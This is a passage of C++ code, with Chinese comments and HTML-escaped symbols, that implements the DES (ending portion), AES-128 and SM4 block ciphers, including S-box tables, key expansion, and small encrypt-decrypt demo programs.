+ '0');            val = val % 8;            op += char(val / 4 + '0');            val = val % 4;            op += char(val / 2 + '0');            val = val % 2;            op += char(val + '0');        }        op = permute(op, per, 32);        x = xor_(op, left);        left = x;        // 交换左右        if (i != 15) {            swap(left, right);        }        cout &lt;&lt; \"轮数: \" &lt;&lt; i + 1 &lt;&lt; \" \" &lt;&lt; bin2hex(left)             &lt;&lt; \" \" &lt;&lt; bin2hex(right) &lt;&lt; \" \" &lt;&lt; rk[i]             &lt;&lt; endl;    }    // 左右结合    string combine = left + right;    // IP逆置换    int final_perm[64]            = { 40, 8,  48, 16, 56, 24, 64, 32, 39, 7,  47,                15, 55, 23, 63, 31, 38, 6,  46, 14, 54, 22,                62, 30, 37, 5,  45, 13, 53, 21, 61, 29, 36,                4,  44, 12, 52, 20, 60, 28, 35, 3,  43, 11,                51, 19, 59, 27, 34, 2,  42, 10, 50, 18, 58,                26, 33, 1,  41, 9,  49, 17, 57, 25 };    string cipher = bin2hex(permute(combine, final_perm, 64));    return cipher;}int main(){    string pt, key;    cout&lt;&lt;\"请输入明文: \";    cin&gt;&gt;pt;    cout&lt;&lt;\"请输入密文: \";    cin&gt;&gt;key;    pt = string_to_hex(pt);    cout&lt;&lt;pt;    key = string_to_hex(key);    key = hex2bin(key);    int keyp[56]            = { 57, 49, 41, 33, 25, 17, 9,  1,  58, 50, 42, 34,                26, 18, 10, 2,  59, 51, 43, 35, 27, 19, 11, 3,                60, 52, 44, 36, 63, 55, 47, 39, 31, 23, 15, 7,                62, 54, 46, 38, 30, 22, 14, 6,  61, 53, 45, 37,                29, 21, 13, 5,  28, 20, 12, 4 };    //密钥生成    key = permute(key, keyp, 56);    int shift_table[16] = { 1, 1, 2, 2, 2, 2, 2, 2,                            1, 2, 2, 2, 2, 2, 2, 1 };    int key_comp[48] = { 14, 17, 11, 24, 1,  5,  3,  28,                         15, 6,  21, 10, 23, 19, 12, 4,                         26, 8,  16, 7,  27, 20, 13, 2,                         41, 52, 31, 37, 47, 55, 30, 40,                         51, 45, 33, 48, 44, 49, 39, 56,                         34, 53, 46, 42, 50, 36, 29, 32 };    string left = key.substr(0, 28);    string right = key.substr(28, 28);    vector&lt;string&gt; rkb;    vector&lt;string&gt; rk;    for (int i = 0; i &lt; 16; i++) {        left = shift_left(left, shift_table[i]);        right = shift_left(right, shift_table[i]);        string combine = left + right;        string RoundKey = permute(combine, key_comp, 48);        rkb.push_back(RoundKey);        rk.push_back(bin2hex(RoundKey));    }    cout &lt;&lt; \"加密:\\n\";    string cipher = encrypt(pt, rkb, rk);    cout &lt;&lt; \"密文: \" &lt;&lt; cipher &lt;&lt; endl;    cout &lt;&lt; \"解密:\\n\";    reverse(rkb.begin(), rkb.end());    reverse(rk.begin(), rk.end());    string text = encrypt(cipher, rkb, rk);    text = hex_to_string(text);    cout &lt;&lt; \"明文: \" &lt;&lt; text &lt;&lt; endl;}\n\n\n\nAES#include &lt;iostream&gt;#include &lt;bits/stdc++.h&gt;#include &lt;stdint.h&gt;#include&lt;iomanip&gt;void AddRoundKey(uint8_t mtx[],uint32_t w[]);uint32_t SubKeys(uint32_t temp);void SubBytes(uint8_t mtx[],int len);void KeyExpansion(uint8_t key[], uint32_t new_key[]);void Display(uint8_t Matrix[]);void DisplayKeys(uint8_t Matrix[][16]);uint32_t left_bit_move(uint32_t val, int n);using namespace std;uint32_t T[4][256];//存储4张列混淆表int mixCol[4][4] = {        {0x02, 0x03, 0x01, 0x01},        {0x01, 0x02, 0x03, 0x01},        {0x01, 0x01, 0x02, 0x03},        {0x03, 0x01, 0x01, 0x02}};//列混淆矩阵uint8_t S_Box[16][16] =        {                {0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76},                {0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0},                {0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15},                {0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75},                {0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84},                {0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF},                {0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8},                {0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2},                {0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73},                {0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB},                {0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79},                {0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08},                {0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A},                {0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E},                {0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF},                {0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16}        };//逆S盒uint8_t Inv_S_Box[16][16] =        {                {0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB},                {0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB},                {0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E},                {0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25},                {0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92},                {0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84},                {0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06},                {0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B},                {0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73},                {0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E},                {0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B},                {0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4},                {0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F},                {0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF},                {0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61},                {0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D}        };//轮密钥加uint32_t LunMiYaoJia[10] = {0x01000000, 0x02000000, 0x04000000, 0x08000000, 0x10000000,                            0x20000000, 0x40000000, 0x80000000, 0x1b000000, 0x36000000};uint32_t left_bit_move(uint32_t val, int n) {    uint32_t size = sizeof(val) * 8;    n = n % size;    return (val &gt;&gt; (size - n) | (val &lt;&lt; n));//左移    //return (val &lt;&lt; (size - n) | (val &gt;&gt; n));//右移}string string_to_hex(const string&amp; str) //字符串转化为十六进制{    string result=\"\";    string tmp;    stringstream ss;    for(int i=0;i&lt;str.size();i++)    {        ss&lt;&lt;hex&lt;&lt;int(str[i])&lt;&lt;endl;        ss&gt;&gt;tmp;        result+=tmp;    }    return result;}string hex_to_string(const std::string&amp; str){    std::string result;    for (size_t i = 0; i &lt; str.length(); i += 2)//十六进制两个字符为原始字符一个字符    {        std::string byte = str.substr(i, 2);//每次切两个字符        //将十六进制的string转成long再强转成int再转成char        char chr = (char)(int)strtol(byte.c_str(), NULL, 16);        result.push_back(chr);//将处理完的字符压入result中    }    return result;}//制作列混淆表uint8_t Mul_02(uint8_t x){    if((x&gt;&gt;7) == 0)        return x&lt;&lt;1;    else        return ((x&lt;&lt;1)^0x1b)&amp;0xff;}uint32_t get_output_col1(uint8_t x){    x = (uint32_t)x;    return (Mul_02(x)&lt;&lt;24)|(x&lt;&lt;16)|(x&lt;&lt;8)|(x^ Mul_02(x));    //2113}uint32_t get_output_col2(uint8_t x){    x = (uint32_t)x;    return ((x^Mul_02(x))&lt;&lt;24)|(Mul_02(x)&lt;&lt;16)|(x&lt;&lt;8)|(x);    //3211}uint32_t get_output_col3(uint8_t x){    x = (uint32_t)x;    return (x&lt;&lt;24)|((x^Mul_02(x))&lt;&lt;16)|(Mul_02(x)&lt;&lt;8)|(x);    //1321}uint32_t get_output_col4(uint8_t x){    x = (uint32_t)x;    return (x&lt;&lt;24)|(x&lt;&lt;16)|((x^Mul_02(x))&lt;&lt;8)|(Mul_02(x));    //1132}void get_TAB(){    for(int i=0;i&lt;4;i++) {        for (int j = 0; j &lt; 256; j++) {            T[i][j]=0;        }    }    for(int i=0;i&lt;256;i++) {        T[0][i] = get_output_col1((uint8_t) i);        T[1][i] = get_output_col2((uint8_t) i);        T[2][i] = get_output_col3((uint8_t) i);        T[3][i] = get_output_col4((uint8_t) i);    }    //输出列混淆表//    for(int i=0;i&lt;4;i++) {//        for (int j = 0; j &lt; 256; j++) {//            //printf(\"%8x \",T[i][j]);//            cout &lt;&lt;setw(8)&lt;&lt;setfill('0')&lt;&lt; hex &lt;&lt; T[i][j] &lt;&lt; \" \";//        }//        cout&lt;&lt;endl;//    }}uint8_t GFMul(uint8_t a, uint8_t b) {    uint8_t p = 0;    uint8_t high;    for (int counter = 0; counter &lt; 8; counter++)    {        if ((b &amp; uint8_t(1)) != 0){//判断当前b的最后一位是否为0            p ^= a;}// p与a异或  即如果b当前最后一位不是0，就加上现在的a        high = (uint8_t) (a &amp; uint8_t(0x80));//高4位，看是否会溢出，high=1就是溢出        a &lt;&lt;= 1;//a左移一位，即乘以2        if (high != 0){//发生溢出            a ^= 0x1b; }// x^8 + x^4 + x^3 + x + 1        b &gt;&gt;= 1;//右移，看b的下一位了    }    return p;}void KeyExpansion(uint8_t key[], uint32_t w[]){    int j=0;    uint32_t temp=0;    // w[]的前4个就是输入的key    //初始化w[0]-&gt;w[3]    for(int i=0; i&lt;4;i++){        w[i] = (key[4*i]&lt;&lt;24)|(key[4*i+1]&lt;&lt;16)|(key[4*i+2]&lt;&lt;8)|(key[4*i+3]);        //printf(\"%d:%x\\n\",i,w[i]);    }    //创建w[4]-&gt;w[43]    for(int i=4; i&lt;44;i++){        if(i%4==0){            temp = left_bit_move(w[i-1],8);//循环左移8位            temp =  SubKeys(temp);            w[i] = temp ^ w[i-4] ^ LunMiYaoJia[j++];            //printf(\"%d:%x\\n\",i,w[i]);        }        else {            w[i] = w[i - 1] ^ w[i - 4];            //printf(\"%d:%x\\n\",i,w[i]);        }    }}void AddRoundKey(uint8_t mtx[],uint32_t w[]){    for(int i=0; i&lt;4; i++){        uint8_t w1 = w[i] &gt;&gt; 24 &amp; 0xff;        uint8_t w2 = (w[i] &gt;&gt; 16) &amp; 0xff;        uint8_t w3 = (w[i] &gt;&gt; 8) &amp; 0xff;        uint8_t w4 = (w[i]) &amp; 0xff;        mtx[i] ^= w1;  //按列异或        mtx[i+4] ^= w2;        mtx[i+8] ^= w3;        mtx[i+12] ^= w4;    }}//  S盒密钥变换 - 前4位为行号，后4位为列号uint32_t SubKeys(uint32_t temp){    uint8_t w[4] = {0};    int j=0;    //循环4次    for(int i=3; i&gt;=0; i--){        w[j++] = (temp&gt;&gt;(i*8))&amp;0xff;    }    SubBytes(w,4);    return (w[0]&lt;&lt;24|w[1]&lt;&lt;16|w[2]&lt;&lt;8|w[3]);}//  S盒变换 - 前4位为行号，后4位为列号void SubBytes(uint8_t mtx[],int len){    for(int i=0; i&lt;len; ++i)    {        int row = ((mtx[i]&gt;&gt;7)&amp;0x1)*8 + ((mtx[i]&gt;&gt;6)&amp;0x1)*4 + ((mtx[i]&gt;&gt;5)&amp;0x1)*2 + ((mtx[i]&gt;&gt;4)&amp;0x1)*1;    //第4 5 6 7位确定行        int col = ((mtx[i]&gt;&gt;3)&amp;0x1)*8 + ((mtx[i]&gt;&gt;2)&amp;0x1)*4 + ((mtx[i]&gt;&gt;1)&amp;0x1)*2 + (mtx[i]&amp;0x1)*1;       //第0 1 2 3位确定列        mtx[i] = S_Box[row][col];    }}void InvSubBytes(uint8_t mtx[],int len){    for(int i=0; i&lt;len; ++i)    {        int row = ((mtx[i]&gt;&gt;7)&amp;0x1)*8 + ((mtx[i]&gt;&gt;6)&amp;0x1)*4 + ((mtx[i]&gt;&gt;5)&amp;0x1)*2 + ((mtx[i]&gt;&gt;4)&amp;0x1)*1;    //第4 5 6 7位确定行        int col = ((mtx[i]&gt;&gt;3)&amp;0x1)*8 + ((mtx[i]&gt;&gt;2)&amp;0x1)*4 + ((mtx[i]&gt;&gt;1)&amp;0x1)*2 + (mtx[i]&amp;0x1)*1;       //第0 1 2 3位确定列        mtx[i] = Inv_S_Box[row][col];    }}//行移位void ShiftRows(uint8_t mtx[]){    uint8_t temp=mtx[4];    //第二行左移一位    for(int i=0; i&lt;3; i++){        mtx[i+4] = mtx[i+5];    }    mtx[7] = temp;    //第三行左移二位    for(int i=0; i&lt;2; i++){        temp = mtx[i+8];        mtx[i+8] = mtx[i+10];        mtx[i+10] = temp;    }    //第四行左移三位    temp = mtx[15];    for(int i=3; i&gt;0; i--) {        mtx[i + 12] = mtx[i + 11];    }    mtx[12] = temp;}void InvShiftRows(uint8_t mtx[]){    // 第二行循环右移一位    uint8_t temp = mtx[7];    for(int i=3; i&gt;0; --i)        mtx[i+4] = mtx[i+3];    mtx[4] = temp;    // 第三行循环右移两位    for(int i=0; i&lt;2; ++i)    {        temp = mtx[i+8];        mtx[i+8] = mtx[i+10];        mtx[i+10] = temp;    }    // 第四行循环右移三位    temp = mtx[12];    for(int i=0; i&lt;3; ++i)        mtx[i+12] = mtx[i+13];    mtx[15] = temp;}void MixColumns(uint8_t c[]){    uint32_t total[4]={0};  //存储每一列取出的4个32比特字节异或的结果，即列混淆后的第i列    uint32_t temp[16]={0};  //存储16个 每个字节从T表得到的32比特的4字节一列    for(int i=0;i&lt;16;i++){        temp[i] = T[i/4][c[i]];    }    for(int i=0; i&lt;4;i++) {        total[i] = temp[i] ^ temp[i+4] ^ temp[i+8] ^ temp[i+12];        c[i] = (total[i]&gt;&gt;24)&amp;0xff;        c[i+4]=(total[i]&gt;&gt;16)&amp;0xff;        c[i+8] = (total[i]&gt;&gt;8)&amp;0xff;        c[i+12] = (total[i])&amp;0xff;    }}void InvMixColumns(uint8_t mtx[]){    uint8_t arr[4];    for(int i=0; i&lt;4; ++i) {        for (int j = 0; j &lt; 4; ++j)            arr[j] = mtx[i + j * 4];        mtx[i] = GFMul(0x0e, arr[0]) ^ GFMul(0x0b, arr[1]) ^ GFMul(0x0d, arr[2]) ^ GFMul(0x09, arr[3]);        mtx[i + 4] = GFMul(0x09, arr[0]) ^ GFMul(0x0e, arr[1]) ^ GFMul(0x0b, arr[2]) ^ GFMul(0x0d, arr[3]);        mtx[i + 8] = GFMul(0x0d, arr[0]) ^ GFMul(0x09, arr[1]) ^ GFMul(0x0e, arr[2]) ^ GFMul(0x0b, arr[3]);        mtx[i + 12] = GFMul(0x0b, arr[0]) ^ GFMul(0x0d, arr[1]) ^ GFMul(0x09, arr[2]) ^ GFMul(0x0e, arr[3]);    }}void Encrypt(uint8_t m[],uint32_t key[],uint8_t c[]){    //首先进行开始的轮密钥加    int round=0;    uint32_t w[4]={0};    for(int k=0; k&lt;4; k++)        w[k] = key[4*round+k];    for(int i=0; i&lt;16; i++)        c[i] = m[i];    AddRoundKey(c,w);    //接下来是9轮一摸一样的函数    for(int i = 1;i&lt;=9;i++)    {        SubBytes(c,16);//字节替代        ShiftRows(c);//行移位        MixColumns(c);//列混淆        round++;        //cout&lt;&lt;\"轮数\"&lt;&lt;round&lt;&lt;endl;        for(int k=0; k&lt;4; k++) {            w[k] = key[4 * round + k];        }        AddRoundKey(c,w);//轮密钥加    }    //最后一轮    round++;    //cout&lt;&lt;\"轮数\"&lt;&lt;round&lt;&lt;endl;    for(int k=0; k&lt;4; k++) {        w[k] = key[4 * round + k];        //(\"%x \",w[k]);    }    SubBytes(c,16);//字节替代    ShiftRows(c);//行移位    AddRoundKey(c,w);//轮密钥加}void Decrypt(uint8_t c[],uint32_t key[],uint8_t m[]){    //首先进行开始的轮密钥加    //注意密钥反着来    int round=10;    uint32_t w[4]={0};    for(int k=0; k&lt;4; k++)        w[k] = key[4*round+k];  //密钥赋值    for(int i=0; i&lt;16; i++)        m[i] = c[i];    AddRoundKey(m,w);    //接下来是9轮一摸一样的函数    for(int i = 1;i&lt;=9;i++)    {        InvShiftRows(m);//行移位        InvSubBytes(m,16);//字节替代        round--;        //cout&lt;&lt;\"轮数\"&lt;&lt;round&lt;&lt;endl;        for(int k=0; k&lt;4; k++) {            w[k] = key[4 * round + k];        }        AddRoundKey(m,w);//轮密钥加        InvMixColumns(m);//列混淆    }    //最后一轮    round--;    //cout&lt;&lt;\"轮数\"&lt;&lt;round&lt;&lt;endl;    for(int k=0; k&lt;4; k++) {        w[k] = key[4 * round + k];        //(\"%x \",w[k]);    }    InvShiftRows(m);//行移位    InvSubBytes(m,16);//字节替代    AddRoundKey(m,w);//轮密钥加}void Display(uint8_t Matrix[]){    for(int i=0; i&lt;16; i++) {        printf(\"%x \", Matrix[i]);        if(i%4==3)            cout&lt;&lt;endl;    }}void DisplayKeys(uint32_t Matrix[]){    for(int i=0; i&lt;44; i++) {        printf(\"第%d列:%x\\n\",i,Matrix[i]);    }}int main(){    string mingwen;    string miwen;    uint8_t key[16]={0};    uint8_t m[16]={0};    cout&lt;&lt;\"请输入明文(128bits):\";    cin&gt;&gt;mingwen;    cout&lt;&lt;\"请输入密文(128bits):\";    cin&gt;&gt;miwen;    for(int i=0;i&lt;16;i++)    {        m[i] = (uint8_t)(mingwen[i]);        key[i] = (uint8_t)(miwen[i]);    }    uint8_t c[16]={0};    uint8_t x[16]={0};    uint32_t new_key[44]={0};   //存储44列密钥    cout&lt;&lt;\"明文:\"&lt;&lt;endl;    Display(m);    cout&lt;&lt;\"密钥:\"&lt;&lt;endl;    Display(key);    get_TAB();//生成列混淆表    KeyExpansion(key,new_key);    cout&lt;&lt;\"生成密钥\"&lt;&lt;endl;    //DisplayKeys(new_key);    Encrypt(m,new_key,c);    cout&lt;&lt;\"加密结果\"&lt;&lt;endl;    Display(c);    Decrypt(c,new_key,x);    cout&lt;&lt;\"解密结果(hex)\"&lt;&lt;endl;    Display(x);    cout&lt;&lt;\"解密结果(string)\"&lt;&lt;endl;    for(int i=0;i&lt;16;i++)        cout&lt;&lt;(char)x[i];    return 0;}\n\n\n\n\n\nSM4#include \"string.h\"#include&lt;iostream&gt;#include &lt;stdint.h&gt;#include&lt;string&gt;using namespace std;uint32_t shift_l(uint32_t s,int n)//循环左移n位{    int size=sizeof (s)*8;      //字节数乘以8代表一共多少位    return s&lt;&lt;(n)|(s&gt;&gt;size-n);}uint32_t Sb(uint32_t s) {    uint8_t SboxTable[16][16] =            {                    {0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05},                    {0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99},                    {0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62},                    {0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6},                    {0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8},                    {0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35},                    {0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87},                    {0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e},                    {0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1},                    {0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3},                    {0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f},                    {0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51},                    {0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8},                    {0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0},                    {0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84},                    {0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48}};    uint8_t a[4];    a[0]=(s&gt;&gt;24)&amp;0xff;     //最高8位    a[1]=(s&gt;&gt;16)&amp;0xff;    a[2]=(s&gt;&gt;8)&amp;0xff;    a[3]=s&amp;0xff;    uint8_t b[4];    for(int i=0;i&lt;4;i++) {        int row = ((a[i] &gt;&gt; 7) &amp; 1) * 8 + ((a[i] &gt;&gt; 6) &amp; 1) * 4 + ((a[i] &gt;&gt; 5) &amp; 1) * 2 + ((a[i] &gt;&gt; 4) &amp; 1) * 1;        int col = ((a[i] &gt;&gt; 3) &amp; 1) * 8 + ((a[i] &gt;&gt; 2) &amp; 1) * 4 + ((a[i] &gt;&gt; 1) &amp; 1) * 2 + ((a[i]) &amp; 1) * 1;        b[i] = SboxTable[row][col];    }    uint32_t result;    result=(b[0]&lt;&lt;24)|(b[1]&lt;&lt;16)|(b[2]&lt;&lt;8)|b[3];    return result;}uint32_t L_change(uint32_t s){    return s^ shift_l(s,13)^ shift_l(s,23);}uint32_t T_change(uint32_t s){    return L_change(Sb(s));}void keyexpand(uint32_t MK[4],uint32_t rk[32]){    uint32_t FK[4]={0xA3B1BAC6, 0x56AA3350,0x677D9197, 0xB27022DC};    uint32_t CK[32] = { 0x00070E15, 0x1C232A31, 0x383F464D, 0x545B6269,                        0x70777E85, 0x8C939AA1, 0xA8AFB6BD, 0xC4CBD2D9,                        0xE0E7EEF5, 0xFC030A11, 0x181F262D, 0x343B4249,                        0x50575E65, 0x6C737A81, 0x888F969D, 0xA4ABB2B9,                        0xC0C7CED5, 0xDCE3EAF1, 0xF8FF060D, 0x141B2229,                        0x30373E45, 0x4C535A61, 0x686F767D, 0x848B9299,                        0xA0A7AEB5, 0xBCC3CAD1, 0xD8DFE6ED, 0xF4FB0209,                        0x10171E25, 0x2C333A41, 0x484F565D, 0x646B7279 };    uint32_t k[4]={MK[0]^FK[0],MK[1]^FK[1],MK[2]^FK[2],MK[3]^FK[3]};    uint32_t K[36];    for(int i=0;i&lt;=3;i++)        K[i]=k[i];    for(int i=0;i&lt;32;i++)    {        K[i+4]=K[i]^ T_change(K[i+1]^K[i+2]^K[i+3]^CK[i]);    }    for(int i=0;i&lt;32;i++)        rk[i]=K[i+4];}uint32_t Lchange(uint32_t s){    return s^shift_l(s,2)^shift_l(s,10)^shift_l(s,18)^shift_l(s,24);}uint32_t Tchange(uint32_t s){    return Lchange(Sb(s));}uint32_t fround(uint32_t X[4],uint32_t rk){    uint32_t B=X[1]^X[2]^X[3]^rk;    return X[0]^ L_change(Sb(B));}static uint32_t out1[4];void SM4(uint32_t X[4],uint32_t rk[32]){    uint32_t Y[36];    Y[0]=X[0];    Y[1]=X[1];    Y[2]=X[2];    Y[3]=X[3];    for(int i=0;i&lt;=31;i++) {        Y[i + 4] = Y[i] ^ Tchange(Y[i + 1] ^ Y[i + 2] ^ Y[i + 3] ^ rk[i]);    }//    for(int i=0;i&lt;36;i++) {//        printf(\"第%d轮:%x \\n\",i,Y[i]);//    }    out1[0]=Y[35];    out1[1]=Y[34];    out1[2]=Y[33];    out1[3]=Y[32];}static uint32_t out2[4];void sm4(uint32_t Y[4],uint32_t rk[32]){    uint32_t X[36];    X[35]=Y[0];    X[34]=Y[1];    X[33]=Y[2];    X[32]=Y[3];    for(int i=31;i&gt;=0;i--)    {        X[i]=X[i+4]^ Tchange(X[i+3]^X[i+2]^X[i+1]^rk[i]);    }    out2[0]=X[0];    out2[1]=X[1];    out2[2]=X[2];    out2[3]=X[3];}int main() {    uint32_t ming[4]={0x01234567,0x89ABCDEF,0xFEDCBA98,0x76543210};    cout&lt;&lt;\"明文:\"&lt;&lt;endl;    for(int i=0;i&lt;4;i++)        cout&lt;&lt;hex&lt;&lt;ming[i]&lt;&lt;\" \";    cout&lt;&lt;endl;    uint32_t MK[4]={0x01234567,0x89ABCDEF,0xFEDCBA98,0x76543210};    cout&lt;&lt;\"密钥：\"&lt;&lt;endl;    for(int i=0;i&lt;4;i++)        cout&lt;&lt;hex&lt;&lt;MK[i]&lt;&lt;\" \";    cout&lt;&lt;endl;    uint32_t rk[32];    keyexpand(MK,rk);//    cout&lt;&lt;\"扩展密钥：\"&lt;&lt;endl;//    for(int i=0;i&lt;32;i++)//        cout&lt;&lt;i&lt;&lt;\"轮扩展密钥\"&lt;&lt;rk[i]&lt;&lt;endl;    cout&lt;&lt;\"加密结果：\"&lt;&lt;endl;    SM4(ming,rk);    for(int i=0;i&lt;4;i++)        cout&lt;&lt;out1[i]&lt;&lt;\" \";    cout&lt;&lt;endl;    cout&lt;&lt;\"解密结果:\"&lt;&lt;endl;    sm4(out1,rk);    for(int i=0;i&lt;4;i++)        cout&lt;&lt;out2[i]&lt;&lt;\" \";    cout&lt;&lt;endl;    return 